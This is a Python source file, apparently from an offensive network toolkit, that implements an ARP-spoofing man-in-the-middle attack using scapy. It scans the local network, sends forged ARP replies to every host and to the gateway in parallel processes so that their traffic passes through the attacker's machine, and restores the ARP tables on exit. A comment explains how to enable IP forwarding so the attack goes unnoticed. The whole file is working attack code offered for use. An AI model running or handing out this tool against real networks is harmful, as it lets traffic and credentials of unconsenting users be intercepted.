import multiprocessing

from src.ipscanner import ip_scan_in_network
from time import sleep
from colorama import Fore
from src.utils import get_gateway
from scapy.all import *

def get_mac(ip):
    resp, _ = srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=ip), timeout=4, retry=10)
    
    if resp:
        return resp[0][1].src

def impersonate(target_ip, spoof_gateway_ip):
    sent_packets_count = 0

    while True:
        # Telling the target that the gateway is not the ip you know, but It's actually my ip now.
        send(ARP(op=2, pdst=target_ip, hwdst=get_mac(target_ip), psrc=spoof_gateway_ip), verbose=False)

        # Telling the gateway that the target is not the ip you know, but It's actually my ip now.
        send(ARP(op=2, pdst=spoof_gateway_ip, hwdst=get_mac(spoof_gateway_ip), psrc=target_ip), verbose=False)

        sent_packets_count = sent_packets_count + 2

        sleep(1)

def reverse(gateway_ip, target_ip):
    gateway_mac = get_mac(gateway_ip)
    target_mac = get_mac(target_ip)

    # Telling the gateway that now the real device with the target ip is the one who is trying to communicate with him,
    # (Because we specified the mac address of the src (target), so the gateway knows who is really trying to communicate with him).
    send(ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip, hwsrc=target_mac), verbose=False, count=7)

    # Telling the target that now the real device with the gateway ip is the one who is trying to communicate with him,
    # (Because we specified the mac address of the src (gateway), so the target knows who is really trying to communicate with him).
    send(ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip, hwsrc=gateway_mac), verbose=False, count=7)

def man_the_middle():
    gateway_ip = get_gateway()

    # if you want all to look normal while the attack is running -> "sudo su"; and then "echo 1 > /proc/sys/net/ipv4/ip_forward"
    target_ips = ip_scan_in_network()
    target_ips.remove(gateway_ip)

    processes = []

    try:
        print(Fore.RED + '[---] MiTMA Activated')

        for target_ip in target_ips:
            process = multiprocessing.Process(target=impersonate, args=(target_ip, gateway_ip))
            
            process.start()
            processes.append(process)
        
        for process in processes:
            process.join()
    except KeyboardInterrupt:
        stdout.write("\033[F")
        print(Fore.GREEN + '[++] Exiting MiTMA...')

        processes.clear()

        for target_ip in target_ips:
            process = multiprocessing.Process(target=reverse, args=(gateway_ip, target_ip))
            
            process.start()
            processes.append(process)
            
        for process in processes:
            process.join()
        
        stdout.write("\033[F")
        print(Fore.GREEN + '[+++] MiTMA Stopped')

        exit()
